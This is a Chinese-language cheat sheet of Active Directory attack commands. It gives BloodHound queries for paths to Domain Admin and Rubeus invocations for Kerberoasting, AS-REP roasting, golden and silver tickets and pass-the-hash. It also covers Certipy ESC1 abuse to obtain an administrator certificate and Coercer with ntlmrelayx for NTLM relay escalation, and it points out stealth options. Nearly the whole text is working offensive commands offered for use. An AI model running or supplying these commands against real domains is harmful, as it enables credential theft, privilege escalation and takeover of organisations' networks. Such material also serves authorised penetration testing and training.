# BloodHound / Mimikatz / 域渗透工具

> **难度：** ★★★★☆ | **用途：** AD 域渗透
> 
> 最后更新：2026-05-14

---

## BloodHound

### 数据收集
```bash
# SharpHound（推荐）
SharpHound.exe -c All --zip
# PowerShell 版
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
```

### 关键 Cypher 查询
```cypher
// 查找 Domain Admin 最短路径
MATCH p=shortestPath((n:User {name:'DOMAIN\\user'})-[*1..]->(g:Group {name:'DOMAIN\\Domain Admins'}))
RETURN p

// Kerberoastable 用户
MATCH (u:User {hasspna:true}) RETURN u.name, u.serviceprincipalnames

// AS-REP Roastable 用户
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

---

## Rubeus — Kerberos 攻击瑞士军刀

### Kerberoasting
```powershell
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt
Rubeus.exe kerberoast /aes /outfile:hashes.txt  # AES 更隐蔽
```

### AS-REP Roasting
```powershell
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

### 黄金票据
```powershell
Rubeus.exe golden /rc4:<krbtgt_hash> /user:administrator /domain:corp.local /sid:S-1-5-21-... /ptt
```

### 白银票据
```powershell
Rubeus.exe silver /service:cifs/file01.corp.local /rc4:<svc_hash> /user:admin /domain:corp.local /sid:S-1-5-21-... /ptt
```

### Overpass-the-Hash
```powershell
Rubeus.exe asktgt /user:admin /rc4:<ntlm_hash> /ptt
```

### 常用参数

| 参数 | 说明 |
|------|------|
| `/ptt` | 注入当前会话 |
| `/rc4:<hash>` | 使用 NTLM hash |
| `/aes256:<key>` | 使用 AES256 key |
| `/opsec` | 隐蔽操作 |
| `/nowrap` | 票据不换行 |

---

## Certipy — ADCS 攻击

```bash
# 枚举
certipy find -u user@domain.local -p Password1 -dc-ip 10.10.10.1 -vulnerable

# ESC1 攻击
certipy req -u user@domain.local -p Password1 -dc-ip 10.10.10.1 -ca CA-NAME -template VulnerableTemplate -upn administrator@domain.local

# 证书 → NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

---

## Coercer — NTLM Coercion

```bash
# 枚举可 coerc 的方法
coercer list -t 10.10.10.1 -u user -p Password1

# 自动化攻击
coercer coerce -t 10.10.10.1 -u user -p Password1 --listen-ip 10.10.10.2

# 配合 ntlmrelayx
ntlmrelayx -t ldap://10.10.10.1 --escalate-user user
coercer coerce -t 10.10.10.3 -u user -p Password1 --listen-ip 10.10.10.2 --method MS-RPRN
```

**支持方法：** MS-RPRN / MS-EFSR / MS-FSRVP / MS-DFSNM / MS-RRP / MS-SRVS

---

## 其他域渗透工具

| 工具 | 用途 |
|------|------|
| Impacket | psexec/wmiexec/secretsdump/ntlmrelayx |
| CrackMapExec/NetExec | 内网渗透瑞士军刀 |
| Responder | LLMNR/NBT-NS 毒化 + NTLMv2 抓取 |
| mitm6 | IPv6 DNS 中间人 |
| SharpDPAPI | DPAPI 解密 |
| Whisker | Shadow Credentials 攻击 |

---

_→ 参见 [`attacks/network-attacks.md`](../attacks/network-attacks.md) 获取域渗透攻击链_
